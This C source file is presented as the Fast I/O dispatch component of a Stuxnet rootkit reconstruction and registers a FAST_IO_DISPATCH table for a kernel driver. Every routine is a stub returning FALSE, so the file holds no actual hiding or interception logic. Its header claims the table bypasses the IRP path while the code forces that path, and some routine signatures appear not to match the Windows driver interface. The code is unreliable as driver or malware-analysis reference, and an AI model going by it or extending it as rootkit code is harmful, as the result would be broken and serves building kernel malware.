/*
 * rootkit/FastIo.c
 * Stuxnet Rootkit - Fast I/O Dispatch Implementation
 *
 * Based on research-virus/stuxnet
 * https://github.com/research-virus/stuxnet
 *
 * The Fast I/O dispatch table is used to intercept file system requests
 * at the highest performance level, bypassing the IRP path.
 */

#include <ntddk.h>
#include <ntifs.h>

NTSTATUS MrxNet_DispatchPassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

/*
 * FastIoCheckIfPossible - Checks if a Fast I/O operation is possible
 *
 * This routine is called by the I/O manager to determine if a Fast I/O
 * operation can be performed on the file object. Returning FALSE forces
 * the I/O manager to fall back to the IRP path.
 */
BOOLEAN MrxNet_FastIoCheckIfPossible(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    BOOLEAN CheckForReadOperation,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoRead - Fast I/O read routine
 *
 * Handles synchronous reads from the cache. Returns FALSE to force
 * the I/O manager to use the IRP path instead.
 */
BOOLEAN MrxNet_FastIoRead(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    ULONG LockKey,
    PVOID Buffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoWrite - Fast I/O write routine
 *
 * Handles synchronous writes to the cache. Returns FALSE to force
 * the I/O manager to use the IRP path instead.
 */
BOOLEAN MrxNet_FastIoWrite(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    ULONG LockKey,
    PVOID Buffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoQueryBasicInfo - Fast I/O query basic file information
 *
 * Retrieves basic file information (attributes, timestamps, etc.).
 * Returns FALSE to force the IRP path.
 */
BOOLEAN MrxNet_FastIoQueryBasicInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_BASIC_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoQueryStandardInfo - Fast I/O query standard file information
 *
 * Retrieves standard file information (size, allocation size, etc.).
 * Returns FALSE to force the IRP path.
 */
BOOLEAN MrxNet_FastIoQueryStandardInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_STANDARD_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoLock - Fast I/O file locking
 *
 * Handles byte-range locking on files. Returns FALSE to force the IRP path.
 */
BOOLEAN MrxNet_FastIoLock(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PLARGE_INTEGER pLength,
    PEPROCESS pProcess,
    ULONG Key,
    BOOLEAN FailImmediately,
    BOOLEAN ExclusiveLock,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoUnlockSingle - Fast I/O single unlock
 *
 * Unlocks a single byte-range lock on a file.
 */
BOOLEAN MrxNet_FastIoUnlockSingle(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PLARGE_INTEGER pLength,
    PEPROCESS pProcess,
    ULONG Key,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoUnlockAll - Fast I/O unlock all
 *
 * Unlocks all byte-range locks held by a process on a file.
 */
BOOLEAN MrxNet_FastIoUnlockAll(
    PFILE_OBJECT pFileObject,
    PEPROCESS pProcess,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoUnlockAllByKey - Fast I/O unlock all by key
 *
 * Unlocks all byte-range locks with a specific key.
 */
BOOLEAN MrxNet_FastIoUnlockAllByKey(
    PFILE_OBJECT pFileObject,
    PVOID pProcess,
    ULONG Key,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoDeviceControl - Fast I/O device control
 *
 * Handles fast I/O device control requests. Returns FALSE to force IRP.
 */
BOOLEAN MrxNet_FastIoDeviceControl(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PVOID pInputBuffer,
    ULONG InputBufferLength,
    ULONG IoControlCode,
    PVOID pOutputBuffer,
    ULONG OutputBufferLength,
    ULONG *pBytesReturned,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoDetachDevice - Fast I/O detach device
 *
 * Detaches the device from the stack.
 */
BOOLEAN MrxNet_FastIoDetachDevice(
    PDEVICE_OBJECT pSourceDevice,
    PDEVICE_OBJECT pTargetDevice
) {
    return FALSE;
}

/*
 * FastIoQueryNetworkOpenInfo - Fast I/O query network open info
 *
 * Retrieves network open information for a file object.
 */
BOOLEAN MrxNet_FastIoQueryNetworkOpenInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_NETWORK_OPEN_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * MdlRead - MDL-based read
 *
 * Reads data directly into an MDL (Memory Descriptor List).
 */
BOOLEAN MrxNet_MdlRead(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * MdlReadComplete - MDL read complete
 *
 * Completes an MDL-based read operation.
 */
BOOLEAN MrxNet_MdlReadComplete(
    PFILE_OBJECT pFileObject,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * PrepareMdlWrite - Prepare MDL-based write
 *
 * Prepares an MDL for a write operation.
 */
BOOLEAN MrxNet_PrepareMdlWrite(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PMDL *ppMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * MdlWriteComplete - MDL write complete
 *
 * Completes an MDL-based write operation.
 */
BOOLEAN MrxNet_MdlWriteComplete(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoReadCompressed - Compressed read
 *
 * Handles reads from compressed files.
 */
BOOLEAN MrxNet_FastIoReadCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PVOID Buffer,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoWriteCompressed - Compressed write
 *
 * Handles writes to compressed files.
 */
BOOLEAN MrxNet_FastIoWriteCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PVOID Buffer,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * MdlReadCompleteCompressed - Compressed MDL read complete
 *
 * Completes an MDL-based read from a compressed file.
 */
BOOLEAN MrxNet_MdlReadCompleteCompressed(
    PFILE_OBJECT pFileObject,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * MdlWriteCompleteCompressed - Compressed MDL write complete
 *
 * Completes an MDL-based write to a compressed file.
 */
BOOLEAN MrxNet_MdlWriteCompleteCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * FastIoQueryOpen - Fast I/O query open
 *
 * Queries open information for a file object.
 */
BOOLEAN MrxNet_FastIoQueryOpen(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_NETWORK_OPEN_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * MrxNet_FillFastIoRoutines - Fills the FAST_IO_DISPATCH structure
 *
 * Populates the Fast I/O dispatch table with function pointers.
 * All routines return FALSE to force the I/O manager to use IRPs.
 */
VOID MrxNet_FillFastIoRoutines(PFAST_IO_DISPATCH pFastIoDispatch) {
    if (!pFastIoDispatch) return;

    pFastIoDispatch->FastIoCheckIfPossible      = MrxNet_FastIoCheckIfPossible;
    pFastIoDispatch->FastIoRead                 = MrxNet_FastIoRead;
    pFastIoDispatch->FastIoWrite                = MrxNet_FastIoWrite;
    pFastIoDispatch->FastIoQueryBasicInfo       = MrxNet_FastIoQueryBasicInfo;
    pFastIoDispatch->FastIoQueryStandardInfo    = MrxNet_FastIoQueryStandardInfo;
    pFastIoDispatch->FastIoLock                 = MrxNet_FastIoLock;
    pFastIoDispatch->FastIoUnlockSingle         = MrxNet_FastIoUnlockSingle;
    pFastIoDispatch->FastIoUnlockAll            = MrxNet_FastIoUnlockAll;
    pFastIoDispatch->FastIoUnlockAllByKey       = MrxNet_FastIoUnlockAllByKey;
    pFastIoDispatch->FastIoDeviceControl        = MrxNet_FastIoDeviceControl;
    pFastIoDispatch->FastIoDetachDevice         = MrxNet_FastIoDetachDevice;
    pFastIoDispatch->FastIoQueryNetworkOpenInfo = MrxNet_FastIoQueryNetworkOpenInfo;
    pFastIoDispatch->MdlRead                    = MrxNet_MdlRead;
    pFastIoDispatch->MdlReadComplete            = MrxNet_MdlReadComplete;
    pFastIoDispatch->PrepareMdlWrite            = MrxNet_PrepareMdlWrite;
    pFastIoDispatch->MdlWriteComplete           = MrxNet_MdlWriteComplete;
    pFastIoDispatch->FastIoReadCompressed       = MrxNet_FastIoReadCompressed;
    pFastIoDispatch->FastIoWriteCompressed      = MrxNet_FastIoWriteCompressed;
    pFastIoDispatch->MdlReadCompleteCompressed  = MrxNet_MdlReadCompleteCompressed;
    pFastIoDispatch->MdlWriteCompleteCompressed = MrxNet_MdlWriteCompleteCompressed;
    pFastIoDispatch->FastIoQueryOpen            = MrxNet_FastIoQueryOpen;
}

/*
 * MrxNet_RegisterFastIo - Registers Fast I/O with the driver object
 *
 * Allocates and fills a FAST_IO_DISPATCH structure, then attaches it
 * to the driver object. This enables Fast I/O interception.
 */
NTSTATUS MrxNet_RegisterFastIo(PDRIVER_OBJECT pDriverObject) {
    PFAST_IO_DISPATCH pFastIoDispatch;

    if (!pDriverObject) {
        return STATUS_INVALID_PARAMETER;
    }

    pFastIoDispatch = (PFAST_IO_DISPATCH)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(FAST_IO_DISPATCH),
        'lnCx'
    );

    if (!pFastIoDispatch) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlZeroMemory(pFastIoDispatch, sizeof(FAST_IO_DISPATCH));

    MrxNet_FillFastIoRoutines(pFastIoDispatch);

    pDriverObject->FastIoDispatch = pFastIoDispatch;

    return STATUS_SUCCESS;
}

/*
 * MrxNet_UnregisterFastIo - Unregisters Fast I/O
 *
 * Frees the FAST_IO_DISPATCH structure.
 */
VOID MrxNet_UnregisterFastIo(PDRIVER_OBJECT pDriverObject) {
    if (pDriverObject && pDriverObject->FastIoDispatch) {
        ExFreePoolWithTag(pDriverObject->FastIoDispatch, 'lnCx');
        pDriverObject->FastIoDispatch = NULL;
    }
}
